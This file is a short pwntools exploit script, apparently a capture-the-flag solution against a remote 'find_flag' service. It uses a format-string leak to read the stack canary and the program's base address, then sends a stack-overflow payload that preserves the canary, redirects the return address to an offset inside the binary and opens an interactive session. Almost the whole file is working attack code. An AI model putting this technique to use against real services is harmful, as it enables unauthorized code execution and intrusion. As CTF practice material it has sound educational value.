# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('192.168.41.180', 2001)
# libc = ELF('./libc-2.31.so')
#io = process('./find_flag')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

sl('%17$paaa%19$p')
ru('you, ')

canary = int(rn(16),16)<<8
print hex(canary)
process = int(ru('!')[5:],16) - 0x0146F
print hex(process)
dbg()
pay = 'a'* 0x38 + p64(canary) + p64(0xdeadbeef)+p64(process + 0x01231)
sla('else? ',pay)
irt()


